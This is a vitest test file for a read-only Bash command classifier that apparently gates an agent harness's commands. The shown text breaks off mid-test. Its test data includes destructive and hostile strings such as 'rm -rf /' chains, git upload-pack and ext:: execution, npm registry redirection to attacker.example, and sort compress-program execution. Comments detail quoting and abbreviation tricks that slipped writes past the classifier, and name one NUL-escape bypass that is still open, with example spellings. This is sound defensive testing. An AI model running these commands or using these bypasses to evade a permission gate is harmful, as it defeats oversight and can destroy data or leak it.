import { describe, expect, it } from "vitest";
import {
  isReadOnlyBashCommand,
  isReadOnlyBashPipeline,
} from "../../src/runtime/read-only-bash.js";

describe("read-only Bash classifier", () => {
  describe("simple read-only binaries", () => {
    it.each([
      "ls",
      "ls -la",
      "ls -la /tmp",
      "cat /etc/hosts",
      "pwd",
      "which node",
      "find . -name '*.ts'",
      "find . -type f -size +1k",
      "find src -maxdepth 2",
      "grep -r foo src/",
      "rg foo",
      "wc -l src/index.ts",
      "head -20 README.md",
      "tail -f /var/log/app.log",
      "stat src/index.ts",
      "ps aux",
      "whoami",
      "id",
      "env",
      "uname -a",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });
  });

  describe("git read-only subcommands", () => {
    it.each([
      "git status",
      "git status -uno",
      "git log",
      "git log --oneline -20",
      "git diff",
      "git diff HEAD~1",
      "git show HEAD",
      "git branch",
      "git branch --show-current",
      "git fetch origin",
      "git remote -v",
      "git ls-files",
      "git rev-parse HEAD",
      "git describe",
      "git blame README.md",
      "git reflog",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      "git push",
      "git push origin master",
      "git commit",
      "git commit -m wip",
      "git add .",
      "git reset --hard",
      "git checkout master",
      "git rebase main",
      "git merge feature",
      "git stash",
      "git clean -fd",
      "git cherry-pick abc123",
      "git revert HEAD",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  // Task 9d1fff1b: allowlisted git subcommands that MUTATE once given
  // arguments. All six forms were reproduced against real git 2.50.1
  // (scratchpad/git-repro.sh: branch deleted, tag created, config
  // rewritten, file created, reflog emptied, local ref written). Pinned
  // as negative tests so a regression to the bare-name allowlist reddens
  // at least one of these.
  describe("git argument forms that mutate (must block — 9d1fff1b)", () => {
    it.each([
      "git branch -D main",
      "git branch -d main",
      "git branch --delete main",
      "git branch -m old new",
      "git branch newbranch",
      "git branch --set-upstream-to=origin/main",
      "git branch --unset-upstream",
      "git tag v1",
      "git tag -a v1 -m msg",
      "git tag -d v1",
      "git remote add origin https://example.com/a.git",
      "git remote set-url origin https://example.com/b.git",
      "git remote remove origin",
      "git remote rename a b",
      "git remote prune origin",
      "git remote update",
      "git fetch origin main:main",
      "git fetch https://example.com/a.git HEAD:refs/heads/x",
      "git fetch origin +refs/heads/*:refs/remotes/o/*",
      "git diff --output=/tmp/x.patch HEAD~1 HEAD",
      "git log --output=/tmp/x.txt",
      "git show --output=/tmp/x.txt HEAD",
      "git reflog expire --expire=now --all",
      "git reflog delete main@{0}",
      "git reflog drop",
      // Review round 1: --output writes a file at git's OPTION-PARSE time,
      // so it is a write vector on EVERY revision walker, not just
      // diff/log/show. Measured on git 2.50.1 (scratchpad/git-repro2.sh):
      // all three created a file.
      "git rev-list --output=/tmp/x.txt HEAD",
      "git shortlog --output=/tmp/x.txt HEAD",
      "git blame --output=/tmp/x.txt README.md",
      // Review round 1: transport-level local execution. `--upload-pack`
      // ran an operator-named binary (measured, canary created); ext::/fd::
      // transport helpers run a local program (config-dependent, blocked
      // defensively). Both the glued and separated flag forms.
      "git fetch --upload-pack=/tmp/evil.sh /tmp/repo",
      "git fetch --upload-pack /tmp/evil.sh /tmp/repo",
      "git ls-remote --upload-pack=/tmp/evil.sh /tmp/repo",
      "git ls-remote ext::sh -c touch",
      // Single-positional so the `::` danger arm is what blocks it (a
      // 2-positional form would be caught by fetch's count rule anyway,
      // review round 2: keep this test load-bearing for the `::` arm).
      "git fetch ext::sh",
      // Review round 1: no-positional glued branch writes — the ONLY
      // forms that exercise the raw-or-decoded arm of isBranchWriteFlag
      // (the structural no-positional rule cannot see them).
      "git branch --edit-description",
      "git branch -f",
      "git branch --force",
      // Review round 1: flag-before-verb write forms (exercise
      // find(isPositional) / operandTail, not args[0]).
      "git remote -v update",
      "git remote set-head origin -a",
      // Review round 1: end-of-options handling — the operand after `--`
      // must count as positional.
      "git tag -- -weirdtag",
      // Dash-leading operand so the pre-fix all-flags rule would have
      // MISclassified it as no-positional (review round 2: makes the
      // branch `--` path load-bearing, not just the tag/reflog ones).
      "git branch -- -newbranch",
      "git reflog -- expire",
      // Review round 1: the tag-keyword fetch form (three positionals).
      "git fetch origin tag v1",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    // Positive controls: the BARE forms and genuine read invocations of
    // the same subcommands must stay read-only (AC2), including the AC5
    // read corpus that flows through the same classifier.
    it.each([
      "git branch",
      "git branch -a",
      "git branch -vv",
      "git branch --list",
      "git tag",
      "git tag -l",
      "git tag -n5",
      "git remote",
      "git remote -v",
      "git remote show origin",
      "git remote get-url origin",
      "git reflog",
      "git reflog show",
      "git reflog show HEAD",
      "git reflog -n 5",
      "git diff",
      "git log",
      "git show",
      "git status",
      // AC5 read corpus (must classify read-only unchanged).
      "git rev-parse --git-dir",
      "git ls-files -c",
      "git log -c HEAD",
      "git show -c HEAD",
      "git diff --stat",
      "git status --short",
      "git fetch origin",
      // Review round 1: a single-positional fetch from a URL is read-only;
      // the earlier `:`-in-positional rule wrongly blocked it (every URL
      // contains `:`). One positional can only be a remote/URL, never a
      // local-ref-writing refspec (git needs remote AND refspec).
      "git fetch https://example.com/a.git",
      "git ls-remote https://example.com/a.git",
      "git ls-remote origin",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    // Shell-quoting must not launder a write past the positive shape
    // (repo convention, task fdee7d0f): quoting the verb/flag can only
    // fail the positive match and thus BLOCK, never admit.
    it.each([
      'git remote se"t-url" origin x',
      "git remote 'set-url' origin x",
      'git branch -"D" main',
      'git reflog ex"pire" --all',
    ])("blocks quoted write form %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    // Review round 1: these are the ONLY forms that actually exercise the
    // raw-or-decoded decode arms (no positional to catch them structurally,
    // and the flag is quoted so the raw literal misses). The per-arm
    // mutation probe (delete each `decodeShellWord` arm) must redden here.
    it.each([
      'git branch --"set-upstream-to"=origin/main',
      'git diff --"output"=/tmp/x',
      'git rev-list --"output"=/tmp/x HEAD',
    ])("blocks quoted no-positional write form %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("gh read-only verbs", () => {
    it.each([
      "gh pr view 240",
      "gh pr list",
      "gh pr diff 240",
      "gh pr checks 240",
      "gh pr status",
      "gh issue view 1",
      "gh issue list",
      "gh run view 12345",
      "gh run list",
      "gh workflow list",
      "gh repo view",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      "gh pr create",
      "gh pr merge 240",
      "gh pr close 240",
      "gh pr edit 240 --title foo",
      "gh issue create",
      "gh repo clone foo/bar",
      "gh secret set TOKEN",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("cd (pure navigation form)", () => {
    it.each([
      "cd",
      "cd -",
      "cd ..",
      "cd /tmp",
      "cd /Users/lan/git/pandora/harness",
      "cd ~",
      "cd ../other-repo",
      "cd -P /tmp",
      "cd -L .",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      // Chained or redirected `cd` forms mutate more than shell state (or
      // hide a write behind the navigation prefix) and must not be
      // floored: the metachar guard in `isReadOnlyBashCommand` rejects
      // the whole string before `cd` is ever inspected.
      "cd /tmp && rm -rf /",
      "cd /tmp; rm -rf /",
      "cd /tmp || rm -rf /",
      "cd /tmp | rm -rf /",
      "cd $(rm -rf /)",
      "cd `rm -rf /`",
      "cd /tmp > out.txt",
      "cd /tmp < input",
    ])("blocks %s (chained/redirected cd is not read-only)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("npm read-only subcommands (curated allowlist)", () => {
    it.each([
      "npm audit",
      "npm audit --json",
      "npm audit signatures",
      "npm audit --json signatures",
      "npm ls",
      "npm ls --depth=0",
      "npm list",
      "npm view lodash",
      "npm view lodash version",
      "npm info lodash", // alias for view
      "npm show lodash", // alias for view
      "npm outdated",
      "npm why lodash",
      "npm explain lodash", // formal name for why
      "npm ping",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      // Mutating subcommands must stay unclassified (gated), not floored.
      "npm install",
      "npm i lodash",
      "npm ci",
      "npm publish",
      "npm update",
      "npm version patch",
      "npm run build",
      "npm audit fix",
      "npm audit fix --force",
      "npm audit --audit-level high", // separated flag value fails closed
      "npm audit --omit dev", // separated flag value fails closed (any value-taking flag, not just --audit-level)
      // Unknown/future npm subcommand: the allowlist is positive, so an
      // unenumerated verb stays unclassified rather than assumed safe.
      "npm some-future-verb",
      // Aliases are deliberately NOT floored, only canonical spellings.
      "npm la",
      "npm ll",
      "npm v lodash",
    ])("blocks %s (positive allowlist, not a denylist)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    it.each([
      // Shell-quoting spellings of `fix` that a token-equality denylist
      // would miss because none of the RAW tokens equals the string "fix"
      // (npm's own argv parsing strips the quoting before npm ever sees
      // it). The positive-shape check (only `-flags` or literal
      // `signatures` after `audit`) fails closed on all of them.
      "npm audit \"fix\"",
      "npm audit 'fix'",
      "npm audit f''ix",
      "npm audit fi\"x\"",
      "npm audit $'fix'",
    ])("blocks %s (quoted/glued spellings of the mutating audit-fix arm)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    it.each([
      // --registry / --userconfig / --globalconfig redirect npm's network
      // or config lookups to an operator-unverified location; forfeit the
      // floor for ANY otherwise-read-only npm subcommand.
      "npm audit --registry=http://attacker.example",
      "npm audit --registry http://attacker.example",
      "npm ls --registry=http://attacker.example",
      "npm view lodash --userconfig=/tmp/evil.npmrc",
      "npm outdated --globalconfig=/tmp/evil.npmrc",
      // Per-scope registry override: npm resolves a scoped package's
      // registry from `@scope:registry` before the plain `registry` config,
      // so this is an equally live exfiltration vector, not merely a
      // naming variant of the bare --registry flag above.
      "npm view lodash --@scope:registry=http://e.x",
      "npm audit --@myorg:registry=http://e.x",
      // Separated-value form of the scoped flag, deliberately on a
      // NON-audit subcommand (`view`, not `audit`). Review round 3
      // (task 769d5452) found the audit-subcommand spelling of this case
      // (`npm audit --@myorg:registry http://e.x`) inert under a
      // NPM_REGISTRY_FLAG_RE mutation: `npm audit`'s own positive-shape
      // check already rejects any bare positional token after `audit`
      // (see the `sub === "audit"` branch below), so `http://e.x` was
      // blocked by THAT check regardless of the registry guard, and the
      // assertion stayed green even with the scoped-registry guard
      // deleted. `npm view` has no such positional-token check, so this
      // spelling exercises NPM_REGISTRY_FLAG_RE's separated-value branch
      // on its own — verified by mutation: rolling the regex back to
      // /^--registry(=|$)/ flips this and both glued scoped forms, and
      // dropping only the separated-value branch flips exactly this one.
      "npm view lodash --@myorg:registry http://e.x",
    ])("blocks %s (untrusted registry/config source flag)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });

    it("floors `npm audit -fix` deliberately: verified npm behavior is a parse error, not the mutating fix arm", () => {
      // Single dash, not the `fix` subcommand or a recognized flag cluster.
      // Verified npm 11.17.0 behavior: `Unknown cli config "--fix"`, and npm
      // falls back to the plain read-only report — it does NOT run
      // `npm audit fix`. `startsWith("-")` correctly floors this; do not
      // "fix" it into a block without re-verifying npm's parser first.
      expect(isReadOnlyBashCommand("npm audit -fix")).toBe(true);
    });
  });

  describe("harness read-only subcommands", () => {
    it.each([
      "harness doctor",
      "harness validate",
      "harness audit",
      "harness diff",
      "harness list",
      "harness version",
      "harness pause",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      "harness apply",
      "harness approve understanding",
      "harness preflight",
      "harness init",
    ])("blocks %s (write or special-cased elsewhere)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("--version / --help two-token shape", () => {
    it.each([
      "node --version",
      "npm --version",
      "rm --version",
      "git --version",
      "gh --version",
      "harness --version",
      "node -v",
      "node --help",
      "rm --help",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it("blocks a three-token --version shape that would smuggle args", () => {
      expect(isReadOnlyBashCommand("rm --version somefile")).toBe(false);
    });
  });

  describe("shell metacharacter rejection (fail-closed)", () => {
    it.each([
      "ls; rm file",
      "ls && rm file",
      "ls || rm file",
      "ls | tee out",
      "ls > out",
      "ls >> out",
      "ls < input",
      "cat $(rm file)",
      "cat `rm file`",
      "ls\nrm file",
    ])("blocks %s (chaining/redirection/substitution)", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("find write-flag rejection (the only SIMPLE bin with mutating own flags)", () => {
    it.each([
      "find . -delete",
      "find . -name '*.tmp' -delete",
      "find . -exec rm {} +",
      "find . -name x -exec rm {} ;",
      "find . -execdir touch foo {} +",
      "find . -ok rm {} ;",
      "find . -okdir rm {} ;",
      "find . -fprint /tmp/out",
      "find . -fprintf /tmp/out '%p\\n'",
      "find . -fprint0 /tmp/out",
      "find . -fls /tmp/out",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("command-runner binaries classify the wrapped command", () => {
    it.each([
      // Bare / lookup-only forms stay read-only.
      "env",
      "env -u FOO",
      "env -i",
      "env FOO=bar",
      "env FOO=bar BAZ=qux",
      "command",
      "command -v node",
      "command -V node",
      // Runner wrapping a read-only command stays read-only.
      "env ls -la",
      "env FOO=bar ls /tmp",
      "env -u PATH cat /etc/hosts",
      "env -i grep foo src/",
      "command ls -la",
      "command cat /etc/hosts",
      "command git status",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(true);
    });

    it.each([
      // The exact bypass forms from the audit finding.
      "command rm -rf /tmp/x",
      "env rm /tmp/x",
      "env FOO=bar rm -rf /",
      // More runner-wrapped writes.
      "env -u FOO rm /tmp/x",
      "env -i sh -c true",
      "env FOO=bar npm install",
      "command npm ci",
      "command touch foo",
      "command mkdir bar",
      "env PATH=/x command rm file",
      "command env rm file",
      // split-string re-parses a command string: always block.
      "env -S rm -rf /",
      "env --split-string=rm",
      "env -Srm",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("unclassifiable defaults to block (conservative allowlist)", () => {
    it.each([
      "rm /tmp/foo",
      "mv a b",
      "cp a b",
      "mkdir foo",
      "touch foo",
      "chmod +x foo",
      "ln -s a b",
      "npm install",
      "npm i lodash",
      "npm ci",
      "npm run build",
      "npx vitest",
      "pnpm install",
      "yarn",
      "make",
      "make install",
      "apt install foo",
      "pip install foo",
      "cargo build",
      "docker run foo",
      "kubectl apply -f x.yaml",
      "",
      "   ",
      "some-binary-we-have-never-heard-of",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("write-capable bins excluded from the allowlist (own flags/operands write)", () => {
    // `uniq`'s second positional operand is its output file (no clean
    // flag to match), `date -s` sets the clock but `-s` is
    // cluster-ambiguous with benign flags, and `hostname NAME` sets the
    // hostname via a positional operand. All three stay fully excluded.
    // `sort`, `tree`, and `file` write forms are listed here too; their
    // read forms are tested in the guarded-output-flag suite below.
    it.each([
      "sort -o out.txt in.txt",
      "sort --output=out.txt in.txt",
      "uniq in.txt out.txt",
      "uniq in.txt",
      "tree -o listing.txt",
      "file -C -m mymagic",
      "file --compile",
      "date -s 2020-01-01T00:00:00",
      "date",
      "hostname newname",
      "hostname",
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    });
  });

  describe("guarded-output-flag bins: sort, tree, file (re-admitted with write-flag guards)", () => {
    describe("read forms classify as read-only", () => {
      it.each([
        // sort: no -o / --output flag
        "sort FILE",
        "sort -n FILE",
        "sort -nu FILE",
        "sort -r src/index.ts",
        "sort -k1,1 -t: /etc/passwd",
        // sort reads via long flags that are not write/exec vectors:
        // --files0-from reads a file list; a separate -S size arg whose
        // value contains 'T' (2T) is not the temp-dir flag.
        "sort --files0-from=list FILE",
        "sort -S 2T FILE",
        // tree: no -o / --output flag
        "tree DIR",
        "tree /some/dir",
        "tree -L 2 src/",
        // file: no -C / --compile flag; lowercase -c is benign
        "file FILE",
        "file src/index.ts",
        "file -i foo.txt",
        "file -b foo.txt",
        "file -c foo.txt",
      ])("allows %s", (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(true);
      });
    });

    describe("write forms classify as NOT read-only", () => {
      it.each([
        // sort -o: separate flag
        "sort -o out in",
        "sort -o out.txt in.txt",
        // sort --output: long separate
        "sort --output out in",
        // sort --output=FILE: long with equals
        "sort --output=out in",
        "sort --output=out.txt in.txt",
        // sort cluster containing 'o': -no, -rno, -rnofoo (glued value)
        "sort -no out in",
        "sort -rno out in",
        "sort -rnofoo in",
        // sort -oFILE: glued value (lowercase 'o' at position 1 in cluster)
        "sort -oFILE in",
        // sort exec vector: --compress-program runs an arbitrary program on
        // spill temp files (arbitrary code execution, no shell metachar).
        "sort --compress-program=/tmp/evil in",
        "sort --compress-program /tmp/evil in",
        "sort -S 1k --compress-program=/tmp/evil bigfile",
        // sort temp-dir write: -T / --temporary-directory writes scratch
        // files to a caller-chosen path.
        "sort -T /tmp in",
        "sort -T/tmp in",
        "sort --temporary-directory=/tmp in",
        "sort --temporary-directory /tmp in",
        // tree -o: separate flag
        "tree -o list",
        "tree -o listing.txt",
        // tree --output: long separate
        "tree --output list.txt /dir",
        // tree --output=FILE: long with equals
        "tree --output=list.txt",
        // tree cluster containing 'o'
        "tree -no list",
        // file -C: separate flag
        "file -C",
        "file -C -m mymagic",
        // file --compile: long form
        "file --compile",
        "file --compile -m magic",
        // file cluster containing uppercase 'C'
        "file -bC x",
        "file -Cb x",
      ])("blocks %s", (cmd) => {
        expect(isReadOnlyBashCommand(cmd)).toBe(false);
      });
    });
  });
});

describe("read-only Bash pipeline classifier (isReadOnlyBashPipeline)", () => {
  describe("allows a `|` pipeline whose every stage is read-only", () => {
    it.each([
      "gh pr checks 123 | head",
      "gh pr checks 123 | head -5",
      "gh run list | head -20",
      "git log | grep fix",
      "git diff | cat",
      "cat file | wc -l",
      "ls -la | grep ts",
      "cat a | grep x | head",
      "ls|head",
      // A single command (no pipe) classifies exactly like the strict fn.
      "gh pr checks 123",
      "ls -la",
    ])("allows %s", (cmd) => {
      expect(isReadOnlyBashPipeline(cmd)).toBe(true);
    });
  });

  describe("blocks a pipeline if any stage writes, or a non-pipe metachar appears", () => {
    it.each([
      "ls | tee out", // tee writes
      "cat a | tee b | head", // write in the middle stage
      "cat f | sh", // sh not on the allowlist
      "ls | rm x", // rm not on the allowlist
      "grep x | xargs rm", // xargs not on the allowlist
      "find . -delete | cat", // find write flag
      "sort -o out f | head", // sort write flag
      "cat a || rm b", // || surfaces as an empty stage
      "ls && rm x", // && contains &
      "cat a |& grep x", // |& contains &
      "ls & ", // background &
      "echo hi > out | cat", // redirection
      "echo $(rm x) | cat", // command substitution
      "cat `rm x` | head", // backtick substitution
      "| head", // leading pipe -> empty stage
      "ls |", // trailing pipe -> empty stage
      "ls | | head", // doubled pipe -> empty stage
      "", // empty
    ])("blocks %s", (cmd) => {
      expect(isReadOnlyBashPipeline(cmd)).toBe(false);
    });
  });

  it("only the pipeline variant admits a pipe; the strict classifier is unchanged", () => {
    // isReadOnlyBashCommand must keep refusing all chaining for its other
    // consumers (Risk Classifier read-only floor, solution-acceptance
    // write-guard); only isReadOnlyBashPipeline admits a read-only `|`.
    expect(isReadOnlyBashPipeline("gh pr checks 123 | head")).toBe(true);
    expect(isReadOnlyBashCommand("gh pr checks 123 | head")).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Task fdee7d0f: the write-flag guards compared RAW tokens, so any shell
// quoting hid the flag from them while bash still passed it through. Each
// case below was verified against the real binary in a fresh sandbox: the
// command genuinely wrote (or deleted), and the classifier still called it
// read-only. Ground truth was the artefact — a canary file's disappearance
// for `find`, the created output/cache file for `sort`/`file` — not the
// exit code.
//
// Which comparisons the family defeats is not uniform, and the split is the
// interesting part: exact set membership (`FIND_WRITE_FLAGS.has`) and
// long-flag prefix tests (`startsWith("--output=")`) are fully defeated,
// while the short-flag CLUSTER tests survive by accident, because the flag
// letter remains a substring of the quoted token (`-"o"` still contains
// `o`). The fix decodes the token before every one of these comparisons, so
// the surviving-by-accident cases stop depending on that accident.
//
// NOT COVERED, named rather than implied. One channel stays open, measured,
// not made worse by this change; the other channel named here at the time
// (GNU long-option ABBREVIATION) is now CLOSED — see task dd055c1d below,
// which fixes it and pins its own artefact-confirmed test cases in a
// dedicated section further down this file.
//
// 1. NUL escapes inside `$'...'`. bash TRUNCATES a `$'...'` run at a NUL and
//    drops a NUL sitting between runs; `decodeShellWord` emits a literal
//    U+0000 and keeps accumulating, so the decoded value never equals the
//    flag bash actually passes. Artefact-confirmed bypasses (canary deleted
//    / file created), all five NUL spellings `\0 \000 \x00 \u0000
//    \U00000000`:
//      find . -name c $'-delete\0XYZ'      find . -name c -$'\0'delete
//      sort $'--output\0' o.txt data.txt   file $'--compile\0X' -m magic
//    plus the same through the `env` and `command` recursions. Master fails
//    open identically, so this is a pre-existing gap this change does not
//    close and does not widen; the raw-token fallback cannot help, because
//    the raw form matches nothing either.
//
// The `$'...'` cases pinned in this file cover the NON-NUL spellings only.
// Deliberately NOT fixed here: modelling NUL truncation would be a third
// round of teaching this decoder one more bash rule, and the run's halt
// criterion (03-decisions.md D2, written before fix round 1) says to stop
// growing the model and file it instead.
// ---------------------------------------------------------------------------

describe("write-flag guards see through shell quoting (task fdee7d0f)", () => {
  // `find`: exact set membership, fully defeated by every spelling.
  it.each([
    'find . -"delete"',
    "find . -'delete'",
    "find . -\\delete",
    "find . -$'delete'",
    'find . -de"lete"',
    "find . -'exec' rm {} ;",
    'find . -$\'\\x64elete\'',
  ])("blocks the quoted find write flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // Long-flag prefix tests: `sort --output=`, `sort --compress-program=`,
  // `sort --temporary-directory=`, `file --compile`.
  it.each([
    'sort --"output"=out.txt data.txt',
    'sort --outp"ut"=out.txt data.txt',
    "sort --'compress-program'=/bin/cat data.txt",
    'sort --"temporary-directory"=. data.txt',
    'file --"compile" -m magic',
  ])("blocks the quoted long write flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // Short clusters: these already blocked before the fix (the letter stays
  // a substring), pinned so the decode cannot silently drop them.
  it.each(['sort -"o" out.txt data.txt', "sort -'o' out.txt data.txt", 'file -"C" -m magic'])(
    "still blocks the quoted short write flag: %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  // Negative controls: decoding must not turn a genuinely read-only command
  // into a write. Without these the suite could not detect over-blocking.
  it.each([
    "find . -name canary.txt",
    'find . -name "*.ts"',
    "find . -type f",
    "sort data.txt",
    'sort -"n" data.txt',
    "cat data.txt",
    "ls -la",
    "file -m magic data.txt",
  ])("keeps genuinely read-only commands read-only: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(true);
  });

  // An unresolvable word decodes to itself, so classification falls back to
  // today's behaviour rather than to an invented value.
  it("an unterminated quote leaves the token compared raw", () => {
    expect(isReadOnlyBashCommand("find . -name 'x")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Review round 1. Each case measured against real binaries with the artefact
// as ground truth (canary gone / output file created), not the exit code.
// ---------------------------------------------------------------------------

describe("write-flag guards: round-1 findings (task fdee7d0f)", () => {
  // F1. `$"..."` is bash locale quoting. With no catalog it is just a
  // double-quoted run, so `-$"delete"` IS `-delete`. The decoder had no
  // branch for it and SUCCEEDED with a wrong value, so the raw-token
  // fallback never fired. Five artefact-confirmed writes, including through
  // both command-runner recursions.
  it.each([
    'find . -name canary.txt -$"delete"',
    'env find . -name canary.txt -$"delete"',
    'command find . -name canary.txt -$"delete"',
    'sort --outp$"ut"=o.txt data.txt',
    'file --$"compile" -m magic',
  ])("blocks locale-quoted write flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // F2. `env --split-string=CMD` runs CMD. It is the one explicitly
  // fail-closed guard in this function and it was left comparing the RAW
  // token while its neighbours were decoded, so quoting the flag NAME
  // walked past it: measured executing `touch PWNED.txt` with no shell
  // metacharacter anywhere.
  it.each([
    'env --split-"string"=make',
    "env --split-'string'=make",
    "env --split-string=make",
    "env -S make",
  ])("blocks env split-string execution: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // F3. THE DIRECTION PIN. These went BLOCKED -> READONLY when the guards
  // tested the decoded token ALONE: the cluster branch excludes `--` by
  // construction, so a token whose leading `-X` decodes to `--` fell out of
  // the branch that used to match it. Testing raw OR decoded makes
  // "decoding only ever ADDS a match" true by construction; without that
  // shape these go red.
  it.each([
    'sort -"-out"=x.txt data.txt',
    "sort -'-out'=x.txt data.txt",
    'sort -"-o"=x.txt data.txt',
    'file -"-C" -m magic',
  ])("decoding never LOSES a match: %s stays blocked", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // The decode is wired into tree's guard too, but tree is NOT installed on
  // the machine this was measured on, so these are classifier-level only —
  // stated rather than implied. Without them the tree/output decode sites
  // were inert (removing them left the whole suite green).
  it.each([
    'tree -"o" list.txt',
    "tree --'output' list.txt",
    'tree --"output"=list.txt',
  ])("blocks quoted tree output flag (classifier-level, tree not installed): %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // Double-decode shapes. NOTE (round 2): an earlier version of this comment
  // said re-adding the second decode changes nothing because the raw arm
  // covers it. Measured false over 201,252 inputs — it moves 180 of them,
  // all fail-open. `-"-o"=x` below is the discriminating case: it dies
  // under BOTH the double-decode mutant and the decoded-only mutant, which
  // the three long-flag tree cases above cannot detect.
  it.each(["tree -\"'-o'\" d", "tree -$'\\x27-o\\x27' d", 'tree -"-o"=x d', 'tree -"-out" d'])(
    "blocks a doubly-quoted tree output flag: %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  it("keeps a genuinely read-only tree invocation read-only", () => {
    expect(isReadOnlyBashCommand("tree -L 2 src")).toBe(true);
  });

  // ACCEPTED over-blocking, pinned so it is a decision rather than an
  // accident: a quoted operand that decodes EXACTLY to a write flag is
  // blocked even though it is a read. Over-blocking a read is the accepted
  // direction. Verified NOT to extend to the shapes most likely to hurt.
  it.each([
    "find . -name '-delete'",
    'find . -name "-exec"',
    "find . -newer '-exec'",
    "sort -k1 '-o'",
    "file '-C'",
  ])(
    "ACCEPTED over-block: %s",
    (cmd) => {
      expect(isReadOnlyBashCommand(cmd)).toBe(false);
    },
  );

  it.each([
    'find . -name "*delete*"',
    "grep -- -delete data.txt",
    "find . -path './-ok'",
    'sort -"n" data.txt',
  ])("over-blocking does NOT extend to: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Task dd055c1d: GNU/BSD `getopt_long` accepts any UNAMBIGUOUS ABBREVIATION
// of a long option name, not just its full spelling. The pre-fix guards
// compared full spellings only (`--output`, `--compress-program`,
// `--temporary-directory`, `--compile`), so every abbreviation fell through
// and classified read-only while genuinely writing or executing. This is the
// channel task fdee7d0f named in its NOT-COVERED section above and left
// open.
//
// Ground truth is the created/executed artefact, not the exit code, measured
// against BOTH variants installed on the measurement machine: BSD sort
// (macOS 26 `/usr/bin/sort`), GNU coreutils sort 9.11 (Homebrew `gsort`),
// and `file` 5.41 (`/usr/bin/file`, one upstream codebase shared by macOS
// and Linux, so a second "variant" install adds no signal). `tree` (GNU
// tree 2.3.2, Homebrew, not previously installed on any machine this file
// was verified on) was also measured directly: it has no long spelling of
// `-o` at all and accepts NO abbreviation of any long option whatsoever
// (`--opt-toggle` works, `--opt` — a genuine prefix of a real tree option —
// errors `Invalid argument`), so the abbreviation fix is a no-op for tree in
// practice; it is still exercised below at the classifier level because
// `isTreeWriteToken` shares `isOutputWriteToken` with `sort`.
//
// Measured minimum unambiguous prefix (identical on BSD and GNU sort):
//   --output               -> --o   (1 char past `--`)
//   --compress-program     -> --co  (2 chars; `--c` alone is ambiguous with
//                                    `--check` on both binaries and ERRORS,
//                                    it does not run as compress-program)
//   --temporary-directory  -> --t   (1 char past `--`)
//   --compile (file)       -> --co  (2 chars; `--c` alone is ambiguous with
//                                    `--checking-printout` and ERRORS)
// ---------------------------------------------------------------------------

describe("write-flag guards see through long-option ABBREVIATION (task dd055c1d)", () => {
  // AC1: sort --output abbreviations. Artefact-confirmed on BOTH BSD sort
  // and GNU coreutils sort 9.11 (gsort): the output file was created for
  // every one of these forms, on both binaries, before this fix classified
  // them read-only.
  it.each([
    "sort --out=x.txt data.txt",
    "sort --o=x.txt data.txt",
    "sort --outp=x.txt data.txt",
    "sort --ou=x.txt data.txt",
    "sort --outpu=x.txt data.txt",
    "sort --out x.txt data.txt", // separated form
    "sort --o x.txt data.txt",
  ])("blocks the abbreviated sort output flag: %s", (cmd) => {
    expect(isReadOnlyBashCommand(cmd)).toBe(false);
  });

  // AC2 (compress-program): every abbreviation from the measured minimum
  // (`--co`) to the full spelling. Artefact: an executed PROGRAM (a shell
  // script that touches a canary file) ran on both BSD sort and gsort when
  // invoked through `--co=./prog`.
  it.each([
    "sort --co=/tmp/evil data.txt",
